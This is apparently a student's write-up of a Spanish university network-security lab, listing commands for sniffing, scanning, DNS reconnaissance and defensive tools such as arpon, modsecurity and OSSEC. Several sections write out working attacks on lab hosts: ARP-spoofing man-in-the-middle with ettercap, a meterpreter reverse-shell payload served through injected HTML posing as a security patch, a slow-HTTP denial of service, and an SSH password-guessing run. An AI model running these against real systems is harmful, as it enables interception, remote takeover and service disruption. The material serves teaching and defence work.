# PRÁCTICA 2 

- [Enunciado](-/enunciado.pdf)

## Nota de la defensa: 3.75/4

&nbsp;

&nbsp;

&nbsp;



# HOW TO

## Apartado A

```bash
root@debian:/home/lsi$ apt install ettercap-text-only
```

## Apartado B

Capture paquetería variada de su compañero de prácticas que incluya varias sesiones HTTP. Sobre esta paquetería  (puede utilizar el wireshark para los siguientes subapartados).

- Identifique los campos de cabecera de un paquete TCP.

- Filtre la captura para obtener el tráfico HTTP.

- Obtenga los distintos "objetos" del tráfico HTTP (imágenes, pdfs, etc.)

- Visualice la paquetería TCP de una determinada sesión.

- Sobre el total de la paquetería obtenga estadísticas del tráfico por protocolo como fuente de información para un análisis básico sobre el tráfico.

- Obtenga información del tráfico de las distintas "conversaciones" mantenidas.

- Obtenga direcciones finales del tráfico de los distintos protocolos como mecanismo para determinar qué circula por nuestras redes.

```bash
root@debian:/home/lsi$ ettercap -Tq -P repoison_arp -w /home/lsi/Documentos/ettercap/archivo.pcap -i ens33 -M arp:remote /10.11.48.70// /10.11.48.1//
```


## Apartado C

Obtenga la relación de las direcciones MAC de los equipos de su segmento.

```bash
root@debian:/home/lsi$ arp -a
root@debian:/home/lsi$ nmap -sP 10.11.48.0/23
root@debian:/home/lsi$ nast -m -i ens33
```

## Apartado D

Obtenga la relación de las direcciones IPv6 de su segmento.

*root@debian:/home/lsi# ping6 -c2 -I ens33 ff02::1 ???*

```bash
root@debian:/home/lsi$ ping -6 -I ens33 ff02::1 

root@debian:/home/lsi$ atk6-alive6 ens33
root@debian:/home/lsi$ ip -6 neigh
```

# Apartado E. Probar y meter datos wireshark

Obtenga el tráfico de entrada y salida legítimo de su interface de red `ens33` e investigue los servicios, conexiones y protocolos involucrados.
```bash
root@debian:/home/lsi$ tcpdump -w /home/lsi/Documentos/tcpdump/snifens33.pcap -i ens33
```

## Apartado F

Mediante arpspoofing entre una máquina objeto (víctima) y el router del laboratorio obtenga todas las URL HTTP visitadas por la víctima.

```bash
root@debian:/home/lsi$ ettercap -i ens33 -P remote_browser -Tq -M arp:remote /10.11.48.70// /10.11.48.1//
```

## Apartado G

Instale metasploit. Haga un ejecutable que incluya Reverse TCP meterpreter payload para plataformas linux. Inclúyalo en un filtro ettercap y aplique toda su sabiduría en ingeniería social para que una víctima u objetivo lo ejecute.

1. Creamos el payload:

```bash
root@debian:/home/lsi$ msfvenom -l payloads | grep "linux/x64"
root@debian:/home/lsi$ msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=10.11.48.69 lport=2222 -f elf -o meta.exe
```
2. Se crea un html.filter

```html
if (ip.proto == TCP && tcp.dst == 80) {
 if (search(DATA.data, "Accept-Encoding")) {
 replace("Accept-Encoding", "Accept-Nothing!");
 }
}

if (ip.proto == TCP && tcp.src == 80) {
 if (search(DATA.data, "<title>")) {
 replace("</title>", "</title><img src="alert.gif"><h1> Hemos detectado un problema de seguridad!</h1><form method="get" action="http://10.11.48.69/meta.exe"><button type="submit"> Click
aquí para descargar los últimos parches de seguridad"</button></form>");
 msg("html injected");
 }
}
```

3. Se inyecta el filtro
```bash
root@debian:/home/lsi$ etterfilter html.filter -o html.ef
root@debian:/home/lsi$ mv meta.exe /var/www/html
root@debian:/home/lsi$ ettercap -Tq -i ens33 -F html.ef -M arp:remote /10.11.48.70// /10.11.48.1//
 
```

4. El atacante ejecuta::
```bash
root@debian:/home/lsi$ msfconsole
> use exploit/multi/handler
> set payload linux/x64/meterpreter_reverse_tcp
2> set lhost 10.11.48.69
> set lport 2222
> exploit 
```
5. Desde la maquina de la víctima:

```bash
root@debian:/home/lsi$ lynx www.google.com
root@debian:/home/lsi$ chmod u+x ./meta.exe
root@debian:/home/lsi$ ./meta.exe
```

## Apartado H----- COMPROBAR

Haga un MITM en IPv6 y visualice la paquetería.

```bash
root@debian:/home/lsi$ atk6-alive ens33
root@debian:/home/lsi$ atk6-parasite6 ens33
```
# Apartado I

Pruebe alguna herramienta y técnica de detección del sniffing (preferiblemente arpon).

- Vaciar arp: `ip -s -s neigh flush all`

```bash
root@debian:/etc$ cat arpon.conf 
#
# ArpON configuration file.
# See the arpon(8) man page for details.
# Static entries matching the eth0 network interface:
#
# First static entry:
#192.168.1.1     58:ac:78:10:b9:77
# Second static entry:
#192.168.1.3     d4:be:d9:fe:8b:45
# Third static entry:
#192.168.1.4     90:94:e4:bb:1c:10
#
# Static entries matching the eth1 network interface:
#
# First static entry:
#10.0.1.1        58:ac:78:88:1a:bb
# Second static entry:
#10.0.10.1       90:94:e4:7e:f4:59

# Router:
10.11.48.1	dc:08:56:10:84:b9

# Compañero: 
10.11.48.70	00:50:56:97:6d:5c
```
Prueba de funcionamiento de arpon:

```bash
# Cliente
$ ettercap -T -q -i ens33 -M arp:remote //10.11.48.70/ //10.11.48.1/

# Máquina
root@debian:/home/lsi$ arp -a # Cambia la mac del router
root@debian:/home/lsi$ systemctl start arpon
root@debian:/home/lsi$ arpon -d -i ens33 -S

# Cliente
$ ettercap -T -q -i ens33 -M arp:remote //10.11.49.146/ //10.11.48.1/

# Máquina
root@debian:/home/lsi$ arp -a # NO cambia la mac del router
```

# Apartado J (Comprobar funcionamiento v6)

Pruebe distintas técnicas de host discovery, port scanning y OS fingerprinting sobre la máquinas del laboratorio de prácticas en IPv4.

```bash
# Toda la información de todas las maquinas de la red
root@debian:/home/lsi$ nmap -A 10.11.48.0/23 > nmap.txt

# Host Discovery: Nodos que están activos en una red.
root@debian:/home/lsi$ map -sL 10.11.48.0/23

# Port Scanning: Sondear un servidor o host para ver sus puertos abiertos.
root@debian:/home/lsi$ nmap -sS 10.11.48.0/23 # Toda la red.
root@debian:/home/lsi$ nmap -sS 10.11.48.70

# Fingerprinting: Identificar el SO de la víctima.
root@debian:/home/lsi$ nmap -O 10.11.48.70
```
IPV6
```bash
root@debian:/home/lsi$ nmap -v -F 10.11.48.70

root@debian:/home/lsi$ atk6-address6 00:50:56:97:6D:5C

root@debian:/home/lsi$ nmap -sS -6 fe80::250:56ff:fe97:6d5c

root@debian:/home/lsi$ nmap -v -A -6 fe80::250:56ff:fe97:6d5c
```

¿Coinciden los servicios prestados por un sistema con los de IPv4?

En este caso sí. Puertos 22 y 514.

# Apartado K. Comprobar que hace cada cosa

Obtenga información "en tiempo real" sobre las conexiones de su máquina, así como del ancho de banda consumido en cada una de ellas.

```bash
root@debian:/home/lsi# nethogs
root@debian:/home/lsi# iftop -i ens33
                    12,5Kb              25,0Kb              37,5Kb              50,0Kb         62,5Kb
└───────────────────┴───────────────────┴───────────────────┴───────────────────┴────────────────────
debian                               => 10.11.49.55                           33,6Kb  6,72Kb  2,59Kb
                                     <=                                       37,3Kb  7,45Kb  2,87Kb
debian                               => 10.30.10.165                           800b    890b   1,65Kb
                                     <=                                        208b    208b    400b
debian                               => sol.udc.pri                            280b     56b     65b
                                     <=                                        576b    115b    118b



─────────────────────────────────────────────────────────────────────────────────────────────────────
TX:             cum:   14,0KB   peak:   34,7Kb                       rates:   34,7Kb  7,65Kb  4,30Kb
RX:                    11,0KB           38,0Kb                                38,0Kb  7,77Kb  3,37Kb
TOTAL:                 24,9KB           72,7Kb                                72,7Kb  15,4Kb  7,67Kb
```

```bash
root@debian:/home/lsi# vnstat -l -i ens33
Monitoring ens33...    (press CTRL-C to stop)

   rx:       504 bit/s     1 p/s          tx:       728 bit/s     0 p/s^C


 ens33  /  traffic statistics

                           rx         |       tx
--------------------------------------+------------------
  bytes                   123,24 KiB  |       60,70 KiB
--------------------------------------+------------------
          max          206,90 kbit/s  |    46,75 kbit/s
      average            7,01 kbit/s  |     3,45 kbit/s
          min              264 bit/s  |         0 bit/s
--------------------------------------+------------------
  packets                       2096  |             983
--------------------------------------+------------------
          max                431 p/s  |         107 p/s
      average                 14 p/s  |           6 p/s
          min                  0 p/s  |           0 p/s
--------------------------------------+------------------
  time                  2,40 minutes

```

# Apartado L. Mirar/hacer

PARA PLANTEAR DE FORMA TEÓRICA:

¿Cómo podría hacer un DoS de tipo direct attack contra un equipo de la red de prácticas?

¿Y mediante un DoS de tipo reflective flooding attack?

> Adistributed denial-of-service attack may involve sending forged requests of some type to a very large number of computers that will reply to the requests. Using Internet Protocol address spoofing, the source address is set to that of the targeted victim, which means all the replies will go to (and flood) the target. (This reflected attack form is sometimes called a "DRDOS".\[66])

# Apartado M. Responder las preguntas

Ataque un servidor apache instalado en algunas de las máquinas del laboratorio de prácticas para tratar de provocarle una DoS. Utilice herramientas DoS que trabajen a nivel de aplicación (capa 7). ¿Cómo podría proteger dicho servicio ante este tipo de ataque? ¿Y si se produjese desde fuera de su segmento de red? ¿Cómo podría tratar de saltarse dicha protección?

```bash
root@debian:/home/lsi$ apt install apache2
root@debian:/home/lsi$ systemctl enable apache2
root@debian:/home/lsi$ systemctl start apache2 
root@debian:/home/lsi$ wget http://127.0.0.1/

# Atacante
root@debian:/home/lsi$ slowhttptest -c 1000 -g -X -o slow_read_stats -r 200 -w 512 -y 1024 -n 5 -z 12 -k 3 -u http://10.11.48.70 -p 3

# Víctima
root@debian:/home/lsi$ wget http://127.0.0.1/ # No funciona

```

- ¿Cómo podría proteger dicho servicio ante este tipo de ataque? 
- ¿Y si se produjese desde fuera de su segmento de red? 
- ¿Cómo podría tratar de saltarse dicha protección?


# Apartado N. Hacer apartado

Instale y configure modsecurity. Vuelva a proceder con el ataque del apartado anterior. ¿Qué acontece ahora?

```bash
root@debian:/home/lsi$ apt install libapache2-mod-security2
root@debian:/home/lsi$ cp /etc/modsecurity/modsecurity.conf-recommended modsecurity.conf

root@debian:/home/lsi# nano /etc/modsecurity/modsecurity.conf
SecRuleEngine On

SecConnEngine On 

SecConnReadStateLimit 10

SecConnWriteStateLimit 10

# Para activar modsecurity
$ a2enmod security2


```

```bash
$ slowhttptest -c 1000 -g -X -o slow_read_stats -r 200 -w 512 -y 1024 -n 5 -z 12 -k 3 -u http://10.11.48.70 -p 3
$ wget http://127.0.0.1
```



## Apartado  O

Buscamos información.:

- Obtenga de forma pasiva el direccionamiento público IPv4 e IPv6 asignado a la Universidade da Coruña.


```bash
$ host www.udc.es
www.udc.es has address 193.144.53.84
www.udc.es has IPv6 address 2001:720:121c:e000::203

$ nslookup www.udc.es
Server:		10.8.12.49
Address:	10.8.12.49#53

Non-authoritative answer:
Name:	www.udc.es
Address: 193.144.53.84
Name:	www.udc.es
Address: 2001:720:121c:e000::203
```

- Obtenga información sobre el direccionamiento de los servidores DNS y MX de la Universidade da Coruña.

```bash
root@debian:/etc$ nslookup -type=ns udc.es
Server:		10.8.12.49
Address:	10.8.12.49#53

Non-authoritative answer:
udc.es	nameserver = zape.udc.es.
udc.es	nameserver = sun.rediris.es.
udc.es	nameserver = zipi.udc.es.
udc.es	nameserver = chico.rediris.es.

Authoritative answers can be found from:
zape.udc.es	internet address = 193.144.52.2
zape.udc.es	has AAAA address 2001:720:121c:e000::102
sun.rediris.es	internet address = 199.184.182.1
sun.rediris.es	has AAAA address 2620:171:808::1
zipi.udc.es	internet address = 193.144.48.30
zipi.udc.es	has AAAA address 2001:720:121c:e000::101
chico.rediris.es	internet address = 162.219.54.2
chico.rediris.es	has AAAA address 2620:10a:80eb::2
```
```bash
root@debian:/etc$ nslookup -type=mx udc.es
Server:		10.8.12.49
Address:	10.8.12.49#53

Non-authoritative answer:
udc.es	mail exchanger = 10 udc-es.mail.protection.outlook.com.

Authoritative answers can be found from:
udc-es.mail.protection.outlook.com	internet address = 104.47.4.36
udc-es.mail.protection.outlook.com	internet address = 104.47.11.202
```
- ¿Puede hacer una transferencia de zona sobre los servidores DNS de la UDC?

```zsh
root@debian:/etc$ dig axfr udc.es

; <<>> DiG 9.16.33-Debian <<>> axfr udc.es
;; global options: +cmd
; Transfer failed.
```

No, falla

- En caso negativo, obtenga todos los nombres.dominio posibles de la UDC.

```bash
$ dnsenum udc.es 
$ nmap -sL 193.144.53.84/20 | grep udc.es
```

- ¿Qué gestor de contenidos se utiliza en www.usc.es?

```bash
root@debian:/home/lsi$ whatweb www.usc.es

http://www.usc.es [301 Moved Permanently] Apache[2.4.41], Country[UNITED STATES][US], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[52.157.220.132], RedirectLocation[https://www.usc.gal/], Title[301 Moved Permanently]

https://www.usc.gal/ [301 Moved Permanently] Apache, Content-Language[gl], Country[UNITED STATES][US], HTML5, HTTPServer[Apache], IP[52.157.220.132], Meta-Refresh-Redirect[https://www.usc.gal/gl], RedirectLocation[https://www.usc.gal/gl], Strict-Transport-Security[max-age=31536000; includeSubDomains; preload], Title[Redirecting to https://www.usc.gal/gl], UncommonHeaders[x-drupal-route-normalizer,x-content-type-options,permissions-policy], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block]

https://www.usc.gal/gl [200 OK] Apache, Content-Language[gl], Country[UNITED STATES][US], HTML5, HTTPServer[Apache], IP[52.157.220.132], MetaGenerator[Drupal 9 (https://www.drupal.org)], Script[application/json], Strict-Transport-Security[max-age=31536000; includeSubDomains; preload], Title[Inicio | Universidade de Santiago de Compostela], UncommonHeaders[x-content-type-options,permissions-policy,link,x-dns-prefetch-control], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block]
```

Drupal 9

## Apartado P.  Comprobar diferencia

Trate de sacar un perfil de los principales sistemas que conviven en su red de prácticas, puertos accesibles, fingerprinting, etc.

```bash
$ nmap -sL 10.11.48.0/23 #  lista de maquinas activas en la red
$ nmap -sP 10.11.48.0/23 #  lista sistema de red
$ nmap -sV 10.11.48.70 # fingerprinting
$ nmap -sV -p <portnum> 10.11.48.70 # fingerprinting de puerto
```

## Apartado Q

Realice algún ataque de “password guessing” contra su servidor ssh y compruebe que el analizador de logs reporta las correspondientes alarmas.

```bash
root@debian:/home/lsi$ medusa -h 10.11.48.70 -u lsi -P pass.txt -M ssh -f

ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: 123456 (1 of 1003 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: 12345 (2 of 1003 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: 123456789 (3 of 1003 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: password (4 of 1003 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: iloveyou (5 of 1003 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: princess (6 of 1003 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: 1234567 (7 of 1003 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: rockyou (8 of 1003 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: 12345678 (9 of 1003 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: abc123 (10 of 1003 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: nicole (11 of 1003 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: daniel (12 of 1003 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: babygirl (13 of 1003 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: monkey (14 of 1003 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: lovely (15 of 1003 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: jessica (16 of 1003 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: 654321 (17 of 1003 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: michael (18 of 1003 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: ashley (19 of 1003 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: qwerty (20 of 1003 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: 111111 (21 of 1003 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: iloveu (22 of 1003 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: 000000 (23 of 1003 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: michelle (24 of 1003 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: tigger (25 of 1003 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: sunshine (26 of 1003 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: chocolate (27 of 1003 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: password1 (28 of 1003 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: soccer (29 of 1003 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: anthony (30 of 1003 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: friends (31 of 1003 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: butterfly (32 of 1003 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: purple (33 of 1003 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.48.70 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: ********** (34 of 1003 complete)
ACCOUNT FOUND: [ssh] Host: 10.11.48.70 User: lsi Password: ********** [SUCCESS]
```
En la mauqina de la victima se pueden observar los logs a tiempo real
``` bash
$ journalctl -f
```

# Apartado R.
Reportar alarmas está muy bien, pero no estaría mejor un sistema activo, en lugar de uno pasivo. Configure algún sistema activo, por ejemplo OSSEC, y pruebe su funcionamiento ante un “password guessing”.

Instalar OSSEC

```bash
$ sudo apt -y install wget git vim unzip make gcc build-essential php php-cli php-common libapache2-mod-php apache2-utils inotify-tools libpcre2-dev zlib1g-dev libz-dev libssl-dev libevent-dev build-essential 

$ apt install libsystemd-dev

$ git clone https://github.com/ossec/ossec-hids
$ cd ossec-hids
$ ./install.sh 
```

To start/stop  OSSEC HIDS:

```bash
$ /var/ossec/bin/ossec-control start
$ /var/ossec/bin/ossec-control stop
```

The configuration can be viewed or modified at 

```bash
$ /var/ossec/etc/ossec.conf
```

Fichero para ver intentos errados:

```bash
$ tail /var/ossec/logs/alerts/alerts.log
```

Ver IPs dropeadas:

```bash
$ Iptables -L 
```

Eliminar IP dropeada:

```bash
$ /var/ossec/active-response/bin/firewall-drop.sh delete - <ip a desbanear>
$ /var/ossec/active-response/bin/host-deny.sh delete - <ip a desbanear> → FALLA! 
```

Check logs:

```bash
$ tail /var/ossec/logs/ossec.log
$ tail /var/ossec/logs/active-responses.log
```

Fichero de configuración donde se puede poner el número de ataques.

```bash
$ nano /var/ossec/rules/sshd_rules.xml
```

# Apartado S

Supongamos que una máquina ha sido comprometida y disponemos de un fichero con sus mensajes de log. Procese dicho fichero con OSSEC para tratar de localizar evidencias de lo acontecido (“post mortem”). Muestre las alertas detectadas con su grado de criticidad, así como un resumen de las mismas.

[ossec-logtest](https://www.ossec.net/docs/docs/programs/ossec-logtest.html#example-2-using-ossec-for-the-forensic-analysis-of-log-files)

```bash

```